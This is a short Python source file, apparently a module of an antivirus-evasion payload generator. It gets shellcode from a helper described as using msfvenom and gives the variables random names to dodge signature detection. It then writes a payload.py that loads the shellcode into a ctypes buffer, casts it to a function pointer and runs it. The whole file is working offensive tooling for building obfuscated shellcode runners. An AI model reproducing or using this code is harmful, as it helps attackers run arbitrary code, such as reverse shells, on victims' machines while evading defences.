from modules.auxiliary import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import supportfiles

def pyvoidpointer():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandShellcode = randomizer.randomString()
    RandReverseShell = randomizer.randomString()
    RandMemoryShell = randomizer.randomString()

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from ctypes import *\n\n')
    PayloadFile.write(RandReverseShell + ' = \"' + Shellcode + '\"\n')
    PayloadFile.write(RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n')
    PayloadFile.write(RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n')
    PayloadFile.write(RandShellcode + '()')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportfiles.supportingFiles()
    messages.endmsg()
